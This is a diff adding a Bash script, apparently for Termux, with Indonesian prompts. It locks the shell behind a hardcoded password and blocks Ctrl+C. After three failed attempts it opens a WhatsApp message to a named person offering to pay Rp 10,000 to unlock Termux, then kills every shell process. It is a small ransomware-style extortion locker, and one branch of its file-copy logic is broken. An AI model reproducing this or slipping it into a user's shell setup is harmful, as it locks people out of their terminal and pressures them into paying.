@@ -1,0 +1,38 @@
+#!/bin/bash
+trap 'trap_ctrlc' SIGINT
+trap_ctrlc() {
+  echo -e "\nPerintah CTRL+C tidak berfungsi di sini."
+}
+PASSWORD="eek"
+MAX_ATTEMPTS=3
+ATTEMPT_COUNT=0
+while [ "$ATTEMPT_COUNT" -lt "$MAX_ATTEMPTS" ]; do
+  read -sp "Masukkan password: " entered_password
+  echo ""
+  if [ "$entered_password" == "$PASSWORD" ]; then
+    echo "Password benar. Selamat datang!"
+    if [ ! -f "$PREFIX/etc/menu" ]; then
+      cat "$PREFIX/etc/menu" > "$HOME/menu"
+      chmod +x "$HOME/menu"
+    fi
+    echo "File menu telah diperbarui."
+    cp "$PREFIX/etc/menu" "$HOME/menu"
+    trap - SIGINT
+    exit 0
+  else
+    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
+    REMAINING_ATTEMPTS=$((MAX_ATTEMPTS - ATTEMPT_COUNT))
+    if [ "$REMAINING_ATTEMPTS" -gt 0 ]; then
+      echo "Password salah. Sisa percobaan: $REMAINING_ATTEMPTS"
+    fi
+  fi
+done
+echo "Anda telah salah memasukkan password sebanyak 3 kali."
+echo "Semua emulator terminal akan dihentikan..."
+echo "Silahkan hubungi habibGM"
+termux-open "https://api.whatsapp.com/send?phone=6281945482681&text=Halo+Admin%2C%0A%0ASaya+ingin+membayar+dengan%0A%0AHarga%3A+Rp+10.000%0A%0Auntuk+membuka+termux+saya+ini"
+sleep 2
+pkill -f termux
+pkill -f sh
+pkill -f zsh
+pkill -f bash
